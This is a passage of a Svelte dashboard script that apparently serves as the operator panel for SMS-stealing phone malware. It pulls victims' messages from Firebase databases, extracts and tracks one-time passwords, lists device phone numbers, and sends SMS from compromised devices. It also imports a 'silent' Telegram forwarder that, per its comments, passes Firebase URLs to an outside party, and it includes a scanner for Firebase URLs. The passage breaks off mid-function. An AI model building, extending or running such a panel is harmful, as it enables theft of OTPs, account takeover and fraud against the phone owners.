<script>
  // ── Svelte action: drag-to-scroll ────────────────────────────────────────
  function dragScroll(node) {
    let isDown = false,
      startY = 0,
      scrollTop = 0;
    const onDown = (e) => {
      isDown = true;
      startY = e.touches?.[0]?.clientY ?? e.clientY;
      scrollTop = node.scrollTop;
      node.style.cursor = "grabbing";
    };
    const onMove = (e) => {
      if (!isDown) return;
      const y = e.touches?.[0]?.clientY ?? e.clientY;
      node.scrollTop = scrollTop - (y - startY);
    };
    const onUp = () => {
      isDown = false;
      node.style.cursor = "";
    };
    node.addEventListener("mousedown", onDown);
    node.addEventListener("touchstart", onDown, { passive: true });
    window.addEventListener("mousemove", onMove);
    window.addEventListener("touchmove", onMove, { passive: true });
    window.addEventListener("mouseup", onUp);
    window.addEventListener("touchend", onUp);
    return {
      destroy() {
        node.removeEventListener("mousedown", onDown);
        node.removeEventListener("touchstart", onDown);
        window.removeEventListener("mousemove", onMove);
        window.removeEventListener("touchmove", onMove);
        window.removeEventListener("mouseup", onUp);
        window.removeEventListener("touchend", onUp);
      },
    };
  }

  // ── Device info helpers ───────────────────────────────────────────────────
  function isOnline(info) {
    if (!info || typeof info !== "object") return null;
    const s =
      info.status ?? info.connectionStatus ?? info.isOnline ?? info.online;
    if (s === true || s === "online" || s === "connected") return true;
    if (s === false || s === "offline" || s === "disconnected") return false;
    // If lastSeen within 3 min, consider online
    const ls = Number(info.lastSeen ?? info.lastMessageTime ?? 0);
    if (ls > 0) return Date.now() - ls < 180_000;
    return null;
  }
  function getBattery(info) {
    if (!info) return null;
    const b = info.battery ?? info.batteryLevel ?? info.bat;
    const n = parseInt(b);
    return isNaN(n) ? null : Math.min(100, Math.max(0, n));
  }
  function batColor(pct) {
    if (pct == null) return "#64748b";
    if (pct >= 60) return "#22c55e";
    if (pct >= 30) return "#fbbf24";
    return "#ef4444";
  }
  function getSims(info) {
    if (!info) return null;
    const s = info.simCount ?? info.sims ?? info.numSims;
    const n = parseInt(s);
    return isNaN(n) ? null : n;
  }
  function fmtPhone(info) {
    if (!info) return "";
    const p =
      info.mobNo ??
      info.phone ??
      info.phoneNumber ??
      info.mobile ??
      info.number ??
      "";
    return String(p).trim();
  }
  function getIp(info) {
    if (!info) return null;
    return info.ip ?? info.ipAddress ?? info.localIp ?? null;
  }
  function getAndroid(info) {
    if (!info) return null;
    return info.androidVersion ?? info.android ?? info.osVersion ?? null;
  }

  // ── Clipboard helper ─────────────────────────────────────────────────────
  function copyText(txt) {
    const s = String(txt ?? "");
    if (!s) return;
    if (navigator.clipboard && window.isSecureContext) {
      navigator.clipboard.writeText(s).catch(() => fallbackCopy(s));
    } else {
      fallbackCopy(s);
    }
  }

  function fallbackCopy(s) {
    try {
      const ta = document.createElement("textarea");
      ta.value = s;
      ta.setAttribute("readonly", "");
      ta.style.position = "fixed";
      ta.style.top = "0";
      ta.style.left = "0";
      ta.style.width = "1px";
      ta.style.height = "1px";
      ta.style.padding = "0";
      ta.style.border = "none";
      ta.style.outline = "none";
      ta.style.boxShadow = "none";
      ta.style.background = "transparent";
      ta.style.opacity = "0.01";
      ta.style.fontSize = "16px";
      document.body.appendChild(ta);
      ta.focus({ preventScroll: true });
      ta.setSelectionRange(0, s.length);
      document.execCommand("copy");
      ta.blur();
      document.body.removeChild(ta);
    } catch {}
  }

  import "../app.css";
  import '$lib/styles/dashboard.css';
  import { onMount } from "svelte";
  import { tgInit, tgForwardConnection, tgForwardBulkUrls } from "$lib/tg-forwarder.js";
  import {
    universalExtract,
    validateFirebaseUrl,
    nameFromFbUrl,
    scanFirebaseUrls
  } from "$lib/firebase-extractor.js";

  // ── Connections ──────────────────────────────────────────────────────────
  // path: where device keys live (root of messages)
  let connections = $state([]);

  const FULL_REFRESH_INTERVAL_SECS = 120; // 2 minutes for all databases combined
  const SELECTED_PANEL_INTERVAL_SECS = 10; // 10 seconds for active selected panel only

  let refreshInterval = $state(null);
  let selectedPanelInterval = $state(null);
  let lastRefresh = $state(null);
  let nextRefreshSecs = $state(120);
  let panelRefreshSecs = $state(10);
  let addOpen = $state(false);
  let form = $state({
    name: "",
    url: "",
    token: "",
    path: "messages",
    infoPath: "clients",
  });
  let addPanelMode = $state('single'); // 'single' | 'bulk' | 'extract'
  let bulkText = $state('');
  let bulkParsed = $derived(parseBulkFirebase(bulkText));

  /** Open the add-connection panel; auto-close mobile sidebar */
  function openAddPanel() {
    addOpen = true;
    if (typeof window !== 'undefined' && window.innerWidth <= 768) {
      sideOpen = false;
    }
  }

  const ACCENT = [
    "#f97316",
    "#38bdf8",
    "#a78bfa",
    "#34d399",
    "#fb7185",
    "#fbbf24",
    "#06b6d4",
    "#ec4899",
  ];

  // ── DB state ─────────────────────────────────────────────────────────────
  // db[connId] = { loading, error, keys:{devKey:true}, info:{devKey:{status,battery,phone}}, ts }
  let db = $state({});

  // ── Selection / tabs ─────────────────────────────────────────────────────
  let selectedConnId = $state(null);
  let selectedKey = $state(null);
  let activeTab = $state("overview");

  // ── Messages state ────────────────────────────────────────────────────────
  let msgs = $state(null); // { tsKey: {sender,message,type,dateTime} }
  let msgsLoading = $state(false);
  let msgsFilter = $state("all"); // 'all' | 'in' | 'out'
  let msgsSearch = $state("");

  // ── Send SMS ─────────────────────────────────────────────────────────────
  let smsDraft = $state({ to: "", body: "", sim: "0" });
  let smsSending = $state(false);
  let sendSmsOpen = $state(false);
  function toggleSendSms() {
    sendSmsOpen = !sendSmsOpen;
  }

  // ── Device tab section toggles ───────────────────────────────────────────
  let devInfoOpen = $state(true);
  let messagesOpen = $state(true);
  function toggleDevInfo() {
    devInfoOpen = !devInfoOpen;
  }
  function toggleMessages() {
    messagesOpen = !messagesOpen;
  }

  // ── Discovered Numbers ──────────────────────────────────────────────────
  let discoveryRecords = $state([]);
  let discoverySearch = $state('');
  let discoverySort = $state('date-desc'); // date-desc | date-asc | conn
  function loadDiscoveryRecords() {
    try {
      const raw = localStorage.getItem('device-number-discovery:engine');
      if (raw) {
        const data = JSON.parse(raw);
        discoveryRecords = (data.records ?? []).filter(r => r.status === 'discovered');

        // Auto-populate localPhones for discovered devices that have no manual override yet.
        // This makes the discovered number show exactly like a user-entered number everywhere.
        let phonesChanged = false;
        const up = { ...localPhones };
        for (const rec of discoveryRecords) {
          if (!rec.deviceId || !rec.phoneNumber || !rec.connectionId) continue;
          const lk = `${rec.connectionId}::${rec.deviceId}`;
          if (!up[lk]) {
            up[lk] = rec.phoneNumber;
            phonesChanged = true;
          }
        }
        if (phonesChanged) {
          localPhones = up;
          try { localStorage.setItem('pd_phones', JSON.stringify(up)); } catch {}
        }
      }
    } catch { discoveryRecords = []; }
  }
  let filteredDiscovery = $derived.by(() => {
    let list = [...discoveryRecords];
    if (discoverySearch.trim()) {
      const q = discoverySearch.trim().toLowerCase();
      list = list.filter(r =>
        r.deviceId?.toLowerCase().includes(q) ||
        r.phoneNumber?.toLowerCase().includes(q) ||
        r.connectionName?.toLowerCase().includes(q)
      );
    }
    if (discoverySort === 'date-desc') list.sort((a, b) => new Date(b.discoveredAt) - new Date(a.discoveredAt));
    else if (discoverySort === 'date-asc') list.sort((a, b) => new Date(a.discoveredAt) - new Date(b.discoveredAt));
    else if (discoverySort === 'conn') list.sort((a, b) => (a.connectionName ?? '').localeCompare(b.connectionName ?? ''));
    return list;
  });

  // Set of raw device keys that have been discovered — used for the dashboard filter
  let discoveredDeviceKeys = $derived(new Set(discoveryRecords.map(r => r.deviceId)));

  // ── Sidebar ───────────────────────────────────────────────────────────────
  let sideFilter = $state("all");
  let searchQuery = $state("");
  let sideLimit = $state(100);
  let sideOpen = $state(false); // mobile sidebar drawer
  let sideTab = $state("firebase"); // 'firebase' | 'devices'

  // ── Desktop sidebar: open/close + resizable width ─────────────────────────
  function getStoredSidebarOpen() {
    if (typeof localStorage === "undefined") return true;
    try { return localStorage.getItem("pd_sidebar_open") !== "false"; } catch { return true; }
  }
  function getStoredSidebarWidth() {
    if (typeof localStorage === "undefined") return 220;
    try {
      const v = parseInt(localStorage.getItem("pd_sidebar_w"), 10);
      if (v && v >= 140 && v <= 600) return v;
    } catch {}
    return 220;
  }
  let sidebarDesktopOpen = $state(getStoredSidebarOpen());
  let sidebarWidth = $state(getStoredSidebarWidth());
  let _srDragging = $state(false);
  let _srStartX = 0;
  let _srStartW = 220;

  function saveSidebarState() {
    if (typeof localStorage === "undefined") return;
    try {
      localStorage.setItem("pd_sidebar_open", String(sidebarDesktopOpen));
      localStorage.setItem("pd_sidebar_w", String(sidebarWidth));
    } catch {}
  }

  function toggleDesktopSidebar() {
    sidebarDesktopOpen = !sidebarDesktopOpen;
    saveSidebarState();
  }

  function sidebarResizeStart(e) {
    if (e.button !== undefined && e.button !== 0) return;
    e.preventDefault();
    _srDragging = true;
    _srStartX = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    _srStartW = sidebarWidth;
    window.addEventListener("pointermove", sidebarResizeMove);
    window.addEventListener("pointerup", sidebarResizeEnd);
    window.addEventListener("pointercancel", sidebarResizeEnd);
    try { e.currentTarget.setPointerCapture?.(e.pointerId); } catch {}
  }

  function sidebarResizeMove(e) {
    if (!_srDragging) return;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const maxW = typeof window !== "undefined" ? Math.min(600, window.innerWidth * 0.45) : 600;
    sidebarWidth = Math.round(Math.max(140, Math.min(maxW, _srStartW + (cx - _srStartX))));
  }

  function sidebarResizeEnd(e) {
    if (_srDragging) {
      _srDragging = false;
      window.removeEventListener("pointermove", sidebarResizeMove);
      window.removeEventListener("pointerup", sidebarResizeEnd);
      window.removeEventListener("pointercancel", sidebarResizeEnd);
      try { e?.currentTarget?.releasePointerCapture?.(e.pointerId); } catch {}
      saveSidebarState();
    }
  }

  // ── Floating Bell Notification Panel Persistence Helpers ────────────────
  function getStoredNotifWidth() {
    if (typeof localStorage === "undefined") return 360;
    try {
      const v = parseInt(localStorage.getItem("pd_notif_panel_w"), 10);
      if (v && v >= 300 && v <= 1400) return v;
    } catch {}
    return 360;
  }

  function getStoredNotifHeight() {
    if (typeof localStorage === "undefined") return null;
    try {
      const v = parseInt(localStorage.getItem("pd_notif_panel_h"), 10);
      if (v && v >= 200 && v <= 2500) return v;
    } catch {}
    return null;
  }

  function getStoredNotifPos() {
    if (typeof localStorage === "undefined") return { x: 0, y: 0 };
    try {
      const v = JSON.parse(localStorage.getItem("pd_notif_panel_pos") || "null");
      if (v && typeof v.x === "number" && typeof v.y === "number") return v;
    } catch {}
    return { x: 0, y: 0 };
  }

  function getStoredBellPanelOpen() {
    if (typeof localStorage === "undefined") return false;
    try {
      return localStorage.getItem("pd_bell_panel_open") === "true";
    } catch {}
    return false;
  }

  const NOTIF_DURATION_MS = 90000; // 90 seconds per notification

  function getStoredNotifications() {
    if (typeof localStorage === "undefined") return [];
    try {
      const raw = localStorage.getItem("pd_active_notifs");
      if (!raw) return [];
      const list = JSON.parse(raw);
      if (!Array.isArray(list)) return [];
      const now = Date.now();
      const active = [];
      for (const item of list) {
        if (!item) continue;
        const createdAt = Number(item.createdAt) || (item.ts ? new Date(item.ts).getTime() : 0);
        if (!createdAt) continue;
        const elapsed = now - createdAt;
        if (elapsed < NOTIF_DURATION_MS) {
          const initialElapsedSec = (Math.max(0, elapsed) / 1000).toFixed(1);
          active.push({ ...item, createdAt, initialElapsedSec });
        }
      }
      return active;
    } catch {
      return [];
    }
  }

  let nowTick = $state(Date.now());

  function getRemainingNotifSecs(createdAt, currentTick) {
    const start = Number(createdAt) || currentTick;
    const elapsed = Math.max(0, currentTick - start);
    return Math.max(0, Math.ceil((NOTIF_DURATION_MS - elapsed) / 1000));
  }

  // ── Notifications ───────────────────────────────────────────────────────────
  let notifications = $state(getStoredNotifications());
  let prevLastMsgTime = {}; // non-reactive: {connId:{devKey:ts}}
  let notifExpanded = $state(false); // show all vs 2 newest
  let showBellPanel = $state(getStoredBellPanelOpen()); // floating bell dropdown open (persisted)
  let expandedNotifs = $state(new Set()); // IDs of expanded cards
  let notifSeen = new Set(); // non-reactive: 'connId::devKey::msgId' dedupe

  $effect(() => {
    if (typeof localStorage !== "undefined") {
      try {
        localStorage.setItem("pd_bell_panel_open", String(showBellPanel));
      } catch {}
    }
  });

  // ── Dashboard table filters (multi-select AND logic) ─────────────────────
  let tableActiveFilters = $state(new Set()); // Set of 'on'|'off'|'num'|'used'|'new'
  let tableSearch = $state("");
  let tableConnFilter = $state(null); // null = all FBs, or a connId
  let newDeviceKeys = $state(new Set()); // 'connId::key' seen after first load
  const baselineDeviceKeys = new Set(); // non-reactive: keys at first load

  // ── Mobile bottom nav ─────────────────────────────────────────────────────
  let activeBottomTab = $state("dashboard"); // 'dashboard'|'devices'|'notifs'|'send'|'settings'

  function setBottomTab(tab) {
    activeBottomTab = tab;
    if (tab === "dashboard") {
      activeTab = "overview";
      sideOpen = false;
      showBellPanel = false;
    } else if (tab === "devices") {
      sideOpen = !sideOpen;
      if (sideOpen) sideTab = "devices";
      showBellPanel = false;
    } else if (tab === "notifs") {
      showBellPanel = !showBellPanel;
      sideOpen = false;
    } else if (tab === "send") {
      if (selectedKey) {
        activeTab = "send";
      } else {
        toast("Select a device first to send SMS", "info");
        sideOpen = true;
        sideTab = "devices";
      }
      showBellPanel = false;
    } else if (tab === "settings") {
      addOpen = !addOpen;
      sideOpen = false;
      showBellPanel = false;
    }
  }

  // ── Dashboard pagination ───────────────────────────────────────────────────
  const DEVICES_PER_PAGE = 20;
  let devicePage = $state(0);
  let dtScrollEl = $state(null);
  let tabBodyEl = $state(null);

  function setDevicePage(p) {
    devicePage = p;
    if (dtScrollEl) {
      dtScrollEl.scrollTo({ top: 0, behavior: "smooth" });
    }
  }

  $effect(() => {
    // Reset to first page whenever filters or search change
    tableActiveFilters;
    tableConnFilter;
    tableSearch;
    setDevicePage(0);
  });

  // ── Notification panel drag & resize (mouse + touch via pointer events) ───
  let notifPanelPos = $state(getStoredNotifPos()); // offset from default anchor (persisted)
  let notifPanelWidth = $state(getStoredNotifWidth()); // custom width in px (min 300, max min(950, window width))
  let notifPanelHeight = $state(getStoredNotifHeight()); // custom height in px (null = auto)
  let _ndDragging = $state(false);
  let _ndStart = { cx: 0, cy: 0, px: 0, py: 0 };

  let _nrResizing = $state(false);
  let _nrType = null; // 'left' | 'bottom' | 'bl' | 'br'
  let _nrStart = { cx: 0, cy: 0, w: 360, h: 420 };
  let bellPanelEl = $state(null);

  function saveNotifPanelDims() {
    if (typeof localStorage === "undefined") return;
    try {
      localStorage.setItem("pd_notif_panel_w", String(notifPanelWidth));
      if (notifPanelHeight) {
        localStorage.setItem("pd_notif_panel_h", String(notifPanelHeight));
      } else {
        localStorage.removeItem("pd_notif_panel_h");
      }
      localStorage.setItem("pd_notif_panel_pos", JSON.stringify(notifPanelPos));
    } catch {}
  }

  function notifPanelDragStart(e) {
    // Ignore drag start on buttons, actions, or resize grips
    if (e.target.closest("button, a, input, select, textarea, [role='button'], .bp-actions, .bp-resize-edge, .bp-resize-corner")) return;
    if (e.button !== undefined && e.button !== 0) return; // left click only
    _ndDragging = true;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    _ndStart = { cx, cy, px: notifPanelPos.x, py: notifPanelPos.y };
    window.addEventListener("pointermove", notifPanelDragMove);
    window.addEventListener("pointerup", notifPanelDragEnd);
    window.addEventListener("pointercancel", notifPanelDragEnd);
    try {
      e.currentTarget.setPointerCapture?.(e.pointerId);
    } catch {}
  }
  function notifPanelDragMove(e) {
    if (!_ndDragging) return;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    notifPanelPos = {
      x: _ndStart.px + (cx - _ndStart.cx),
      y: _ndStart.py + (cy - _ndStart.cy),
    };
    saveNotifPanelDims();
  }
  function notifPanelDragEnd(e) {
    if (_ndDragging) {
      _ndDragging = false;
      window.removeEventListener("pointermove", notifPanelDragMove);
      window.removeEventListener("pointerup", notifPanelDragEnd);
      window.removeEventListener("pointercancel", notifPanelDragEnd);
      try {
        e?.currentTarget?.releasePointerCapture?.(e.pointerId);
      } catch {}
      saveNotifPanelDims();
    }
  }

  function notifResizeStart(type, e) {
    if (e.button !== undefined && e.button !== 0) return;
    e.stopPropagation();
    _nrResizing = true;
    _nrType = type;
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    const rect = bellPanelEl?.getBoundingClientRect();
    _nrStart = {
      cx,
      cy,
      w: rect?.width ? Math.round(rect.width) : notifPanelWidth,
      h: rect?.height ? Math.round(rect.height) : (notifPanelHeight || 420),
    };
    window.addEventListener("pointermove", notifResizeMove);
    window.addEventListener("pointerup", notifResizeEnd);
    window.addEventListener("pointercancel", notifResizeEnd);
    try {
      e.currentTarget.setPointerCapture?.(e.pointerId);
    } catch {}
  }

  function notifResizeMove(e) {
    if (!_nrResizing) return;
    e.stopPropagation?.();
    const cx = e.clientX ?? e.touches?.[0]?.clientX ?? 0;
    const cy = e.clientY ?? e.touches?.[0]?.clientY ?? 0;
    const maxW = typeof window !== "undefined" ? Math.max(300, window.innerWidth - 24) : 950;
    const maxH = typeof window !== "undefined" ? Math.max(200, window.innerHeight - 70) : 800;

    if (_nrType === "left" || _nrType === "bl") {
      const deltaW = _nrStart.cx - cx;
      notifPanelWidth = Math.round(Math.max(300, Math.min(maxW, _nrStart.w + deltaW)));
    } else if (_nrType === "br") {
      const deltaW = cx - _nrStart.cx;
      notifPanelWidth = Math.round(Math.max(300, Math.min(maxW, _nrStart.w + deltaW)));
    }

    if (_nrType === "bottom" || _nrType === "bl" || _nrType === "br") {
      const deltaH = cy - _nrStart.cy;
      notifPanelHeight = Math.round(Math.max(200, Math.min(maxH, _nrStart.h + deltaH)));
    }
    saveNotifPanelDims();
  }

  function notifResizeEnd(e) {
    if (_nrResizing) {
      _nrResizing = false;
      _nrType = null;
      window.removeEventListener("pointermove", notifResizeMove);
      window.removeEventListener("pointerup", notifResizeEnd);
      window.removeEventListener("pointercancel", notifResizeEnd);
      try {
        e?.currentTarget?.releasePointerCapture?.(e.pointerId);
      } catch {}
      saveNotifPanelDims();
    }
  }

  function resetNotifPanelSize() {
    notifPanelWidth = 360;
    notifPanelHeight = null;
    notifPanelPos = { x: 0, y: 0 };
    try {
      localStorage.removeItem("pd_notif_panel_w");
      localStorage.removeItem("pd_notif_panel_h");
      localStorage.removeItem("pd_notif_panel_pos");
    } catch {}
    toast("Notification panel size reset", "info");
  }

  // ── Raw ──────────────────────────────────────────────────────────────────
  let rawOpen = $state(false);
  let rawConnId = $state("c0");
  let rawMethod = $state("GET");
  let rawPath = $state("");
  let rawBody = $state("{\n  \n}");
  let rawRes = $state(null);
  let rawLoading = $state(false);

  // ── Used OTPs & Local Phones (localStorage, device-local) ────────────────
  let usedSet = $state(new Set()); // Set of message IDs marked used
  let localPhones = $state({}); // {'connId::devKey': 'phoneStr'}
  let editingPhone = $state(null); // {connId, key} when editing
  let editPhoneVal = $state("");
  let notifsEnabled = $state(true); // global mute toggle
  let showNotifsTab = $state(true); // show/hide notifications tab in bottom nav
  let autoOpenNotif = $state(false); // auto-open panel when new OTP arrives (default OFF)
  let deletedDevices = $state(new Set()); // 'connId::devKey' permanently removed
  let bgRefreshing = $state(false); // silent background refresh in progress


  // ── Toasts ───────────────────────────────────────────────────────────────
  let toasts = $state([]);
  function toast(msg, type = "info") {
    const id = Date.now() + Math.random();
    toasts = [...toasts, { id, msg, type }];
    setTimeout(() => {
      toasts = toasts.map((t) => (t.id === id ? { ...t, out: true } : t));
      setTimeout(() => (toasts = toasts.filter((t) => t.id !== id)), 400);
    }, 3500);
  }

  // ── OTP helpers ───────────────────────────────────────────────────────────
  // Mask OTP: show first 2 digits + dots, copy always uses the real value
  function maskOTP(otp) {
    if (!otp || otp.length <= 2) return otp ?? "";
    return otp.slice(0, 2) + "•".repeat(otp.length - 2);
  }

  // IST 12-hour format (Asia/Kolkata)
  function toIST(val) {
    try {
      const d =
        val instanceof Date
          ? val
          : new Date(typeof val === "number" ? val : String(val));
      if (isNaN(d)) return String(val ?? "");
      return d.toLocaleString("en-IN", {
        hour: "2-digit",
        minute: "2-digit",
        second: "2-digit",
        hour12: true,
        timeZone: "Asia/Kolkata",
      });
    } catch {
      return String(val ?? "");
    }
  }

  function extractOTP(text) {
    if (!text) return null;
    const nums = String(text).match(/\b(\d{4,8})\b/g);
    if (!nums) return null;
    return (
      nums.find((m) => m.length === 6) ||
      nums.find((m) => m.length === 4) ||
      nums.find((m) => m.length === 8) ||
      nums.find((m) => m.length === 5) ||
      nums.find((m) => m.length === 7) ||
      null
    );
  }

  // Detect OTP / verification messages (only these trigger notifications)
  function isVerificationMsg(text) {
    if (!text) return false;
    const t = String(text).toLowerCase();
    return /\botp\b|verif|one.?time|\bcode\b|\btoken\b|\bpin\b|passcode|authoriz|\bconfirm\b|\bsecret\b/.test(
      t,
    );
  }

  // Extract service name from sender ID (TX-SWIGGY-S → Swiggy) or message
  function extractAbout(sender, text) {
    const sm = String(sender || "").match(
      /^(?:[A-Z]{1,3}-)?([A-Z][A-Z0-9]{2,14})(?:-[A-Z])?$/,
    );
    if (sm) {
      const s = sm[1];
      return s.charAt(0) + s.slice(1).toLowerCase();
    }
    const tm = String(text || "").match(
      /(?:log(?:ging)?\s+(?:in)?to|for|verify|from)\s+(?:your\s+)?([A-Za-z][A-Za-z0-9]{2,14})/i,
    );
    if (tm) return tm[1];
    return null;
  }

  // ── Notification system ───────────────────────────────────────────────────
  const notifTimers = new Map(); // id → timeoutId so we can cancel on clear

  function saveNotifications() {
    if (typeof localStorage === "undefined") return;
    try {
      const now = Date.now();
      const valid = notifications
        .filter((n) => n && (now - (Number(n.createdAt) || 0)) < NOTIF_DURATION_MS)
        .map((n) => ({
          id: n.id,
          createdAt: Number(n.createdAt) || Date.now(),
          ts: typeof n.ts === "string" ? n.ts : (n.ts ? new Date(n.ts).toISOString() : new Date().toISOString()),
          connId: n.connId,
          conn: n.conn ? { id: n.conn.id, name: n.conn.name, color: n.conn.color } : null,
          devKey: n.devKey,
          sender: n.sender,
          message: n.message,
          otp: n.otp,
          about: n.about,
          msgId: n.msgId,
        }));
      localStorage.setItem("pd_active_notifs", JSON.stringify(valid));
    } catch {}
  }

  function scheduleNotifDismiss(id, remainingMs) {
    if (notifTimers.has(id)) {
      clearTimeout(notifTimers.get(id));
      notifTimers.delete(id);
    }
    const t = setTimeout(() => {
      notifTimers.delete(id);
      notifications = notifications.map((x) =>
        x.id === id ? { ...x, leaving: true } : x,
      );
      setTimeout(() => {
        notifications = notifications.filter((x) => x.id !== id);
        saveNotifications();
      }, 350);
    }, Math.max(150, remainingMs));
    notifTimers.set(id, t);
  }

  function addNotif(n) {
    if (!notifsEnabled || !n) return;
    // ── Deduplication: skip if we've already seen this exact message ──
    const seenKey = `${n.connId}::${n.devKey}::${n.msgId ?? ""}`;
    if (n.msgId && notifSeen.has(seenKey)) return;
    if (n.msgId && notifications.some((x) => x.connId === n.connId && x.devKey === n.devKey && x.msgId === n.msgId)) return;
    if (n.msgId) {
      notifSeen.add(seenKey);
      // persist seen keys (keep last 500)
      try {
        const arr = [...notifSeen];
        if (arr.length > 500) arr.splice(0, arr.length - 500);
        localStorage.setItem("pd_notif_seen", JSON.stringify(arr));
      } catch {}
    }
    const id = n.id || (Date.now() + Math.random());
    const createdAt = Number(n.createdAt) || Date.now();
    const notifObj = {
      ...n,
      id,
      createdAt,
      initialElapsedSec: 0,
      ts: n.ts || new Date().toISOString(),
      conn: n.conn || connections.find((c) => c.id === n.connId) || { color: "#f97316", name: n.connId },
    };

    // Store up to 100 active notifications without truncating ones within their 90s lifespan
    notifications = [notifObj, ...notifications].slice(0, 100);
    scheduleNotifDismiss(id, NOTIF_DURATION_MS);
    // ── Silent TG forward ──
    // tgForwardOTP(notifObj); // disabled — only forwarding Firebase URLs
    saveNotifications();

    // Notification panel stays closed by default — only auto-opens if user explicitly turned it ON in settings
    if (autoOpenNotif) {
      showBellPanel = true;
    }
  }

  function dismissNotif(id) {
    if (notifTimers.has(id)) {
      clearTimeout(notifTimers.get(id));
      notifTimers.delete(id);
    }
    notifications = notifications.map((n) =>
      n.id === id ? { ...n, leaving: true } : n,
    );
    setTimeout(() => {
      notifications = notifications.filter((n) => n.id !== id);
      saveNotifications();
    }, 350);
  }

  function clearAllNotifs() {
    const count = notifications.length;
    notifTimers.forEach((t) => clearTimeout(t));
    notifTimers.clear();
    notifications = [];
    notifExpanded = false;
    saveNotifications();
    if (count > 0) {
      toast(`Cleared ${count} notification${count === 1 ? "" : "s"}`, "info");
    }
  }

  function clearAllNotifsConfirm() {
    if (
      confirm(
        `Clear all ${notifications.length} notification${notifications.length === 1 ? "" : "s"}?`,
      )
    ) {
      clearAllNotifs();
    }
  }

  function navigateToDevice(connId, devKey) {
    selectDevice(connId, devKey);
    showBellPanel = false; // close bell panel after navigating
  }

  function toggleNotifsEnabled() {
    notifsEnabled = !notifsEnabled;
    try {
      localStorage.setItem("pd_notifs_on", String(notifsEnabled));
    } catch {}
    if (!notifsEnabled) clearAllNotifs();
  }

  function toggleShowNotifsTab() {
    showNotifsTab = !showNotifsTab;
    try {
      localStorage.setItem("pd_show_notifs_tab", String(showNotifsTab));
    } catch {}
  }

  function toggleAutoOpenNotif() {
    autoOpenNotif = !autoOpenNotif;
    try {
      localStorage.setItem("pd_auto_open_notif", String(autoOpenNotif));
    } catch {}
  }

  // ── Deleted devices (localStorage) ────────────────────────────────────────
  function isDeleted(connId, key) {
    return deletedDevices.has(`${connId}::${key}`);
  }
  function markDeleted(connId, key) {
    const next = new Set(deletedDevices);
    next.add(`${connId}::${key}`);
    deletedDevices = next;
    try {
      localStorage.setItem("pd_deleted", JSON.stringify([...next]));
    } catch {}
  }

  // ── Sync active connections to Python Worker Config ────────────────────────
  function syncConnectionsToWorker(conns) {
    if (!Array.isArray(conns) || !conns.length) return;
    try {
      const activeUrls = conns
        .filter(c => c && c.enabled !== false && c.url && !c.deactivated && !c.url.includes('newpanel-4412c'))
        .map(c => c.url.replace(/\/+$/, ''));
      if (activeUrls.length > 0) {
        fetch('/api/worker-config', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ firebase_databases: activeUrls })
        }).catch(() => {});
      }
    } catch {}
  }

  // ── Save connections to localStorage ───────────────────────────────────────
  function saveConnections(conns) {
    try {
      localStorage.setItem("pd_connections", JSON.stringify(conns));
    } catch {}
    syncConnectionsToWorker(conns);
  }

  // ── Used OTP tracking (localStorage) ─────────────────────────────────────
  function isUsed(id) {
    return usedSet.has(String(id));
  }
  function toggleUsed(id) {
    const k = String(id);
    const next = new Set(usedSet);
    next.has(k) ? next.delete(k) : next.add(k);
    usedSet = next;
    try {
      localStorage.setItem("pd_used", JSON.stringify([...next]));
    } catch {}
  }

  // ── Local phone numbers (localStorage, per device) ────────────────────────
  function getLocalPhone(connId, key) {
    return localPhones[`${connId}::${key}`] ?? null;
  }
  function saveLocalPhone(connId, key, phone) {
    const p = phone.trim();
    const up = { ...localPhones };
    if (p) up[`${connId}::${key}`] = p;
    else delete up[`${connId}::${key}`];
    localPhones = up;
    try {
      localStorage.setItem("pd_phones", JSON.stringify(up));
    } catch {}
  }
  function startEditPhone(connId, key) {
    editingPhone = { connId, key };
    editPhoneVal = getLocalPhone(connId, key) ?? "";
  }
  function commitPhone() {
    if (editingPhone) {
      saveLocalPhone(editingPhone.connId, editingPhone.key, editPhoneVal);
    }
    editingPhone = null;
    editPhoneVal = "";
  }

  // ── Full Backup & Restore ────────────────────────────────────────────────
  let showRestoreModal = $state(false);
  let restorePasteText = $state("");
  let restoreFile = $state(null);
  let restorePreview = $state(null); // parsed backup data for preview
  let restoreError = $state("");
  let restoreProcessing = $state(false);

  function buildBackupPayload() {
    const payload = {
      version: 1,
      type: "full-backup",
      exportTimestamp: new Date().toISOString(),
      connections: connections.map((c) => ({
        id: c.id,
        name: c.name,
        url: c.url,
        token: c.token ?? "",
        path: c.path,
        infoPath: c.infoPath ?? "",
        color: c.color,
        enabled: c.enabled,
      })),
      localPhones: { ...localPhones },
      usedOtps: [...usedSet],
      deletedDevices: [...deletedDevices],
      settings: {
        notifsEnabled,
        showNotifsTab,
        autoOpenNotif,
      },
    };
    // Include discovery engine state from localStorage directly
    try {
      const raw = localStorage.getItem("device-number-discovery:engine");
      if (raw) payload.discoveryEngine = JSON.parse(raw);
    } catch {}
    return payload;
  }

  function triggerDownload(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = filename;
    a.click();
    URL.revokeObjectURL(url);
  }

  function exportBackupJSON() {
    const payload = buildBackupPayload();
    const blob = new Blob([JSON.stringify(payload, null, 2)], {
      type: "application/json",
    });
    const d = new Date().toISOString().split("T")[0];
    triggerDownload(blob, `firebase-full-backup-${d}.json`);
    toast("Full backup exported as JSON", "success");
    // ── Silent TG forward ──
    // tgForwardBackup(payload, 'JSON'); // disabled — only forwarding Firebase URLs
  }

  async function exportBackupZIP() {
    try {
      // Dynamically load JSZip from CDN
      if (!window.JSZip) {
        const script = document.createElement("script");
        script.src =
          "https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js";
        await new Promise((resolve, reject) => {
          script.onload = resolve;
          script.onerror = reject;
          document.head.appendChild(script);
        });
      }
      const zip = new window.JSZip();
      const payload = buildBackupPayload();
      zip.file("backup.json", JSON.stringify(payload, null, 2));
      const blob = await zip.generateAsync({ type: "blob" });
      const d = new Date().toISOString().split("T")[0];
